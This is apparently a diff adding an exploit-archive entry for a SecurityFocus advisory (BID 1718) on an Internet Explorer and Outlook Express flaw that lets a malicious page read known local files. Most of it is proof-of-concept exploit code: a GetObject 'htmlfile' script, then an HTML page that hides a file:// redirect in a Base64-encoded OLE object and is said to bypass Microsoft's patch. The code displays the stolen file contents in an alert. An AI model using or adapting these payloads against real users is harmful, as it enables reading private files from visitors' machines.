@@ -1,0 +1,99 @@
+source: http://www.securityfocus.com/bid/1718/info
+
+
+It is possible for an outside attacker to view known files on a remote system if the target user visits a website or opens an email containing a specially formed script containing the JScript function 'GetObject()' and the ActiveX object 'htmlfile'. Microsoft Internet Explorer or Outlook Express will grant full access to the DOM of a HTML document object if the following code is inserted into HTML formatted document (the 'I" in SCRIPT has been replaced with a "!"):
+
+<SCR!PT>
+alert("Alert Message");
+a=GetObject("c:\\path\filename.ext","htmlfile");
+setTimeout("alert(a.body.innerText);",2000);
+</SCR!PT>
+
+A malicious website operator may be able to view any known file on a remote system through this vulnerability if the website visitor is using Microsoft Internet Explorer.
+
+This vulnerability is due to a flaw in Windows Script Host (WSH), WSH does not properly verify a domain for certain requests in IE and Outlook Express.
+
+**New proof of concept code for this vulnerability can affect users who have already applied the Microsoft supplied patch for this issue. The new code uses Base64 encoding embedded within the HTML, which effectively bypasses the security provided by the patch. 
+
+<HTML>
+<!-- Internet Explorer htmlfile_FullWindowEmbed proof of concept exploit. //-->
+<BODY>
+<!--
+The data parameter string is the Base64 encoded version of
+
+2069 3325 F903 CF11 8FD0 00AA 0068 6F13  i3%.........ho.
+3C73 6372 6970 743E 646F 6375 6D65 6E74 <script>document
+2E6C 6F63 6174 696F 6E2E 6872 6566 3D22 .location.href="
+6669 6C65 3A2F 2F63 3A5C 5C74 6573 742E file://c:\\test.
+7478 7422 3B3C 2F73 6372 6970 743E      txt";</script>  
+//-->
+
+<OBJECT ID="myObject" WIDTH=300 HEIGHT=250 CLASSID="CLSID:25336921-03F9-11CF-8FD0-00AA00686F13" data="data:application/x-oleobject;base64,IGkzJfkDzxGP0ACqAGhvEzxzY3JpcHQ+ZG9jdW1lbnQubG9jYXRpb24uaHJlZj0iZmlsZTovL2M6XFx0ZXN0LnR4dCI7PC9zY3JpcHQ+">
+</OBJECT>
+
+<SCRIPT>
+// Base64 decoder ripped from Robert Graham's page at http://www.robertgraham.com/tools/base64coder.html
+function myBase64Decode(str)
+{
+var result = "", i = 0, x, shiftreg = 0, count = -1;
+      
+for (i=0; i < str.length; i++) {
+ c = str.charAt(i);
+ if ('A' <= c && c <= 'Z')
+  x = str.charCodeAt(i) - 65;
+ else if ('a' <= c && c <= 'z')
+  x = str.charCodeAt(i) - 97 + 26;
+ else if ('0' <= c && c <= '9')
+  x = str.charCodeAt(i) - 48 + 52;
+ else if (c == '+')
+  x = 62;
+ else if (c == '/')
+  x = 63;
+ else
+  continue;
+
+ count++;
+ switch (count % 4) {
+  case 0:
+   shiftreg = x;
+   continue;
+  case 1:
+   v = (shiftreg<<2) | (x >> 4);
+   shiftreg = x & 0x0F;
+   break;
+  case 2:
+   v = (shiftreg<<4) | (x >> 2);
+   shiftreg = x & 0x03;
+   break;
+  case 3:
+   v = (shiftreg<<6) | (x >> 0);
+   shiftreg = x & 0x00;
+   break;
+ }
+ if ((v < 32 || v > 126) && (v != 0x0d) && (v != 0x0a)) {
+  result = result + "<";
+  result = result + "0123456789ABCDEF".charAt((v/16)&0x0F);
+  result = result + "0123456789ABCDEF".charAt((v/1)&0x0F);
+  result = result + ">";
+ } else {
+  result = result + String.fromCharCode(v);
+ }
+}
+return result.toString();
+}
+
+function ReadFile()
+{
+ Data = myObject.outerHTML;
+ Data = Data.substr(Data.indexOf("IGkz")); // start of encoded string
+ Data = Data.substr(0,Data.indexOf(" ")); // end of encoded string
+ alert(myBase64Decode(Data)); // decode and display
+}
+
+alert('Create the file c:\\test.txt and it will be read!');
+setTimeout("ReadFile();",3000);
+//setTimeout("alert(myObject.outerHTML);",2000);
+
+</SCRIPT>
+</BODY>
+</HTML>
